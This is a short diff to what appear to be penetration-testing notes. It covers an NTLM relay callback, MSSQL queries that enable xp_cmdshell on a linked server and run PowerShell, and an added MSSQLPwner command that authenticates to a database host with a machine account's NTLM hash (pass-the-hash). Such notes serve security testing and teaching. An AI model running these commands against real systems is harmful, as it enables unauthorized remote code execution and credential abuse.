@@ -124,6 +124,7 @@ Once it's running we can check if the victim is listening on port 445: `netstat 
 Last step is to perform the Relay - !REMEMEBER! not to our attacking box, but to the victim machine! and see the callback to our machine on port 445 tunneled from the victim!
 
 # MSSQL Useful Queries
+*Note: privileges in a database might differ, check every access you can accomplish, which mean using the local administrator, machine account, etc.*
 
 List databases:
 - `select * from sys.databases;`
@@ -145,4 +146,7 @@ EXEC('sp_configure ''show advanced options'',1; RECONFIGURE') AT SQL03;
 exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
 EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
 ```
+
+MSSQLPwner:
+- `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`
 
